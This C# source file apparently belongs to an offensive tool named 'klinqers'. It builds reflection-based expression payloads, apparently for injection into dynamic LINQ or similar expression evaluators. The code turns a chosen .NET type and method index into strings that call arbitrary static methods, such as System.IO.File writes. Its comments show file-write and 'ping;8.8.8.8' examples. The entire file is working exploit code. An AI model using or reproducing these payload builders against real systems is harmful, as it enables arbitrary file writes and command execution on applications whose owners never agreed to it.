using System;
using System.Collections.Generic;
using System.Reflection;

namespace klinqers
{
    public class CallMethod
    {
        public MethodInfo minf = null;
        public Type type = null;
        public Assembly assembly = null;
        public int methodPosition = -1;
        public string strMethodPart;
        public string strTypePart;
        public Type parameterType = null;

        static string findSuitableSplitter(List<string> lstValues)
        {
            // We rather want a distinct non letter divider since it is easier to read 
            List<string> strCandidates = new List<string>() { ";", ",", "|", "#", "/", "\\", "'", "!", "?", ":", ".", "$", "=", "-", "+", "*", "_", "<", ">", "@", "{", "}", "[", "]" };
            char startChar = 'a';
            char endChar = 'z';
            char startCharCaps = 'A';
            char endCharCaps = 'Z';


            for (char x = startChar; x < endChar; x++)
            {
                strCandidates.Add(x.ToString());
            }

            for (char x = startCharCaps; x < endCharCaps; x++)
            {
                strCandidates.Add(x.ToString());
            }

            for (int x = 0; x < strCandidates.Count; x++)
            {
                bool bFound = true;

                // Check preferred
                for (int i = 0; i < lstValues.Count; i++)
                {
                    string str = lstValues[i];

                    if (str.IndexOf(strCandidates[x]) >= 0)
                    {
                        bFound = false;
                        break;
                    }
                }

                if (bFound)
                {
                    return strCandidates[x];
                }
            }

            return null;
        }

        string getCall()
        {
            return $"\"\".GetType().Assembly.GetType(\"{type.ToString()}\").GetMethods()[{methodPosition}]";
        }

        string getInvokeContent(List<string> lstValues)
        {
            string strSplitter = findSuitableSplitter(lstValues);

            if (strSplitter == null)
            {
                Console.WriteLine("[-] Error! Could not find a suitable splitter. Consider chosing another string.");

                return null;
            }

            string strArray = String.Join(strSplitter, lstValues);

            if (minf.IsStatic)
            {

                string strRetval = "null,\"" + strArray + "\".Split(\"" + strSplitter + "\".ToCharArray()";

                return strRetval;
            }
            else
            {
                Console.WriteLine("[-] Error: non-static-methods not yet supported");
            }

            return null;
        }

        public string buildParameterString(List<string> lstValues)
        {
            if (parameterType == typeof(String))
            {
                // "".GetType().Assembly.GetType("System.IO.File").GetMethods()[37].Invoke(null,"###filename###;###content###".Split(";".ToCharArray()))).ToString()
                //"ping;8.8.8.8".Split(";".ToCharArray()))

                string strInvokeContent = getInvokeContent(lstValues);
                string strCall = getCall();

                string strRetval = $"{strCall}.Invoke({strInvokeContent}).ToString()";

                return strRetval;
            }

            return null;
        }
    }
}
